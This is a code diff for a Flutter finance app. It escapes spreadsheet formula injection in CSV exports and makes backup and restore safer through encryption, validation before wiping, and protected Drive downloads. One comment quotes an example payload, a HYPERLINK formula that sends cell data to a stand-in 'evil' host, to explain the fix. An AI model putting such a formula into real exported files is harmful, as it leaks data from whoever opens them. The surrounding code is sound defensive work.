@@ -23,6 +23,21 @@ import 'db_service.dart';
 
 // Export expenses to CSV
 
+/// Neutralises spreadsheet formula injection in an exported cell.
+///
+/// Excel and LibreOffice evaluate any cell whose text begins with `=`, `+`,
+/// `-`, `@`, a tab, or a carriage return. A transaction described
+/// `=HYPERLINK("http://evil/"&A1,"click")` would therefore execute when the
+/// export is opened. Prefixing with an apostrophe forces the spreadsheet to
+/// treat the value as literal text; the apostrophe itself is not displayed.
+///
+/// Only [String] cells are at risk — numbers and dates are emitted by the
+/// caller as their own types and pass through untouched.
+Object? csvSafeCell(Object? value) {
+  if (value is! String || value.isEmpty) return value;
+  return RegExp(r'^[=+\-@\t\r]').hasMatch(value) ? "'$value" : value;
+}
+
 List<List<dynamic>> _expenseCsvRows(List<Expense> expenses) => [
       [
         'ID',
@@ -38,12 +53,12 @@ List<List<dynamic>> _expenseCsvRows(List<Expense> expenses) => [
       ],
       ...expenses.map((e) => [
             e.id ?? '',
-            e.description,
+            csvSafeCell(e.description),
             // Export human-readable major units (e.g. 120.50).
             minorToMajor(e.amount).toStringAsFixed(2),
             e.date.toIso8601String(),
-            e.category,
-            e.paymentMode,
+            csvSafeCell(e.category),
+            csvSafeCell(e.paymentMode),
             e.type,
             e.accountId ?? '',
             e.toAccountId ?? '',
@@ -79,10 +94,10 @@ Future<File> exportInvestmentsToCsv() async {
     ['ID', 'Name', 'Amount', 'Date', 'Type'],
     ...investments.map((i) => [
           i.id ?? '',
-          i.name,
+          csvSafeCell(i.name),
           minorToMajor(i.amount).toStringAsFixed(2),
           i.date.toIso8601String(),
-          i.type,
+          csvSafeCell(i.type),
         ]),
   ];
   String csvData = const ListToCsvConverter().convert(rows);
@@ -99,6 +114,26 @@ Future<File> exportInvestmentsToCsv() async {
 class DriveBackupException implements Exception {
   final String message;
   DriveBackupException(this.message);
+  @override
+  String toString() => message;
+}
+
+/// Raised when a file offered for restore isn't a backup at all (wrong JSON
+/// shape, a renamed CSV, a truncated download). Restoring clears the database
+/// first, so this must be caught *before* anything is wiped.
+class BackupFormatException implements Exception {
+  final String message;
+  BackupFormatException(this.message);
+  @override
+  String toString() => message;
+}
+
+/// Raised when a backup parses correctly but contains no rows in any table.
+/// Applying it would silently wipe every transaction, so the caller must
+/// confirm with the user and retry with `allowEmpty: true`.
+class EmptyBackupException implements Exception {
+  final String message;
+  EmptyBackupException(this.message);
   @override
   String toString() => message;
 }
@@ -182,16 +217,34 @@ class BackupService {
     if (last != null && DateTime.now().difference(last) < minInterval) {
       return false;
     }
-    await backupToJson(deviceKey: await DBService().deviceKeyIfEncrypted());
-    await prefs.setString(
-        _kLastAutoBackup, DateTime.now().toIso8601String());
+    // This runs unguarded during launch, so it must not throw. If the device
+    // key is unavailable while encryption is on, skip the backup rather than
+    // fall back to writing a plaintext copy of everything.
+    final String? deviceKey;
+    try {
+      deviceKey = await DBService().deviceKeyIfEncrypted();
+    } catch (e) {
+      AppLogger.error(
+          'Skipping auto-backup: database encryption is on but its key could '
+          'not be read, and an unencrypted backup would defeat it',
+          e);
+      return false;
+    }
+    await backupToJson(deviceKey: deviceKey);
+    await prefs.setString(_kLastAutoBackup, DateTime.now().toIso8601String());
     return true;
   }
 
   /// Writes the full-data JSON backup and returns the file so it can be
   /// shared/downloaded by the user.
+  ///
+  /// When at-rest database encryption is on the file is written as an
+  /// encrypted envelope, exactly like the auto-backup — otherwise this path
+  /// would drop a readable copy of every transaction on disk (and hand it to
+  /// the share sheet) the moment the user tapped "Backup locally". Use
+  /// [writeEncryptedBackup] for a copy that can be restored on another device.
   Future<File> writeJsonBackupFile() async {
-    await backupToJson();
+    await backupToJson(deviceKey: await DBService().deviceKeyIfEncrypted());
     return _backupFile;
   }
 
@@ -245,7 +298,7 @@ class BackupService {
   /// Restores from the local encrypted backup. Throws on a wrong passphrase or
   /// corrupt/missing file.
   Future<void> restoreFromEncryptedFile(String passphrase,
-      {bool clearBeforeRestore = true}) async {
+      {bool clearBeforeRestore = true, bool allowEmpty = false}) async {
     final file = await _encryptedBackupFile;
     if (!await file.exists()) {
       throw Exception('No encrypted backup found on this device');
@@ -253,11 +306,13 @@ class BackupService {
     final envelope = await file.readAsString();
     final plain = await BackupCrypto.decryptString(envelope, passphrase);
     await _applyRestore(jsonDecode(plain),
-        clearBeforeRestore: clearBeforeRestore);
+        clearBeforeRestore: clearBeforeRestore, allowEmpty: allowEmpty);
   }
 
   Future<void> restoreFromJson(
-      {bool clearBeforeRestore = true, String? deviceKey}) async {
+      {bool clearBeforeRestore = true,
+      String? deviceKey,
+      bool allowEmpty = false}) async {
     final file = await _backupFile;
     if (!await file.exists()) return;
     var content = await file.readAsString();
@@ -274,14 +329,65 @@ class BackupService {
       content = await BackupCrypto.decryptString(content, deviceKey);
     }
     await _applyRestore(jsonDecode(content),
-        clearBeforeRestore: clearBeforeRestore);
+        clearBeforeRestore: clearBeforeRestore, allowEmpty: allowEmpty);
+  }
+
+  /// The table keys a backup payload carries, in the order they are restored.
+  static const _backupTableKeys = [
+    'accounts',
+    'expenses',
+    'investments',
+    'budgets',
+    'recurring_rules',
+    'templates',
+  ];
+
+  /// Throws [BackupFormatException] unless [data] is shaped like a backup.
+  ///
+  /// Restoring wipes the database before inserting, so every failure mode has
+  /// to be caught here rather than part-way through. Previously `data['version']`
+  /// was indexed straight off a `dynamic`, so a JSON file that wasn't an object
+  /// (a renamed CSV, say) surfaced as a raw `NoSuchMethodError`.
+  static void _validateBackupPayload(dynamic data) {
+    if (data is! Map) {
+      throw BackupFormatException(
+          'That file is not a Finance Tracker backup — expected a JSON object, '
+          'found ${data is List ? 'a list' : 'a ${data.runtimeType}'}.');
+    }
+    final version = data['version'];
+    if (version != null && version is! num) {
+      throw BackupFormatException(
+          'That backup has an unreadable version field, so it may be corrupt.');
+    }
+    for (final key in _backupTableKeys) {
+      final table = data[key];
+      if (table != null && table is! List) {
+        throw BackupFormatException(
+            'That backup is corrupt: "$key" should be a list of rows.');
+      }
+    }
   }
 
   /// Validates the backup payload, converts it to row maps, and applies it in
   /// one database transaction: a malformed backup or an interruption rolls
   /// back, leaving the existing data untouched.
+  ///
+  /// Set [allowEmpty] only after the user has confirmed they really mean to
+  /// replace their data with an empty backup.
   Future<void> _applyRestore(dynamic data,
-      {bool clearBeforeRestore = true}) async {
+      {bool clearBeforeRestore = true, bool allowEmpty = false}) async {
+    _validateBackupPayload(data);
+
+    if (clearBeforeRestore && !allowEmpty) {
+      final totalRows = _backupTableKeys.fold<int>(
+          0, (sum, key) => sum + ((data[key] as List?)?.length ?? 0));
+      if (totalRows == 0) {
+        throw EmptyBackupException(
+            'That backup contains no transactions, accounts, or budgets. '
+            'Restoring it would erase everything currently in the app.');
+      }
+    }
+
     // Backups before v4 stored amounts as major-unit doubles; convert them
     // to integer minor units so they match the current storage.
     final legacyAmounts = ((data['version'] ?? 0) as num) < 4;
@@ -351,7 +457,10 @@ class BackupService {
 
   Future<void> backupToDrive() async {
     final driveApi = await _getDriveApi();
-    await backupToJson();
+    // Encrypt with the device key when at-rest encryption is on, matching
+    // autoBackupIfDue. Without this the Drive copy went up as plaintext *and*
+    // overwrote the encrypted local auto-backup, since both share _backupFile.
+    await backupToJson(deviceKey: await DBService().deviceKeyIfEncrypted());
     final file = await _backupFile;
     final length = await file.length();
 
@@ -393,7 +502,7 @@ class BackupService {
 
     // Update last sync time
     final prefs = await SharedPreferences.getInstance();
-    await prefs.setString('last_backup_time', DateTime.now().toIso8601String());
+    await prefs.setString(_kLastBackup, DateTime.now().toIso8601String());
   }
 
   /// Checks if the remote backup is newer than the last local backup.
@@ -417,7 +526,7 @@ class BackupService {
       if (remoteFile.modifiedTime == null) return false;
 
       final prefs = await SharedPreferences.getInstance();
-      final lastBackupStr = prefs.getString('last_backup_time');
+      final lastBackupStr = prefs.getString(_kLastBackup);
 
       if (lastBackupStr == null) {
         // We have never backed up from this device, but a remote file exists.
@@ -436,7 +545,7 @@ class BackupService {
     }
   }
 
-  Future<void> restoreFromDrive() async {
+  Future<void> restoreFromDrive({bool allowEmpty = false}) async {
     final driveApi = await _getDriveApi();
     final fileList = await driveApi.files.list(
       spaces: 'appDataFolder',
@@ -459,13 +568,49 @@ class BackupService {
       downloadOptions: drive.DownloadOptions.fullMedia,
     ) as drive.Media;
 
-    final file = await _backupFile;
-    final sink = file.openWrite();
-    await media.stream.pipe(sink);
-    await sink.flush();
-    await sink.close();
+    // Download to a temp file first. Streaming straight over _backupFile
+    // destroyed the user's local safety-net backup before we knew the remote
+    // payload was even usable — a truncated download then left them with
+    // neither. Validate, then swap.
+    final target = await _backupFile;
+    final temp = File('${target.path}.download');
+    try {
+      final sink = temp.openWrite();
+      await media.stream.pipe(sink);
+      await sink.flush();
+      await sink.close();
 
-    await restoreFromJson(clearBeforeRestore: true);
+      // Parse (and decrypt, if this is a device-key envelope) before the
+      // local backup is touched, so a corrupt download fails harmlessly.
+      var content = await temp.readAsString();
+      if (BackupCrypto.isEncrypted(content)) {
+        final deviceKey = await DBService().deviceKeyIfEncrypted();
+        if (deviceKey == null) {
+          throw Exception(
+              'The Drive backup is encrypted with this device\'s key, which '
+              'is no longer available. Enable database encryption on this '
+              'device, or restore from a passphrase-encrypted backup.');
+        }
+        content = await BackupCrypto.decryptString(content, deviceKey);
+      }
+      final data = jsonDecode(content);
+      _validateBackupPayload(data);
+
+      // Restore first, adopt second. If the restore throws — corrupt rows, or
+      // an unconfirmed empty backup — the local backup is still the user's own
+      // last good copy rather than whatever came down from Drive.
+      await _applyRestore(data,
+          clearBeforeRestore: true, allowEmpty: allowEmpty);
+      await temp.rename(target.path);
+    } finally {
+      if (await temp.exists()) {
+        try {
+          await temp.delete();
+        } catch (e) {
+          AppLogger.error('Failed to clean up partial Drive download', e);
+        }
+      }
+    }
   }
 }
 
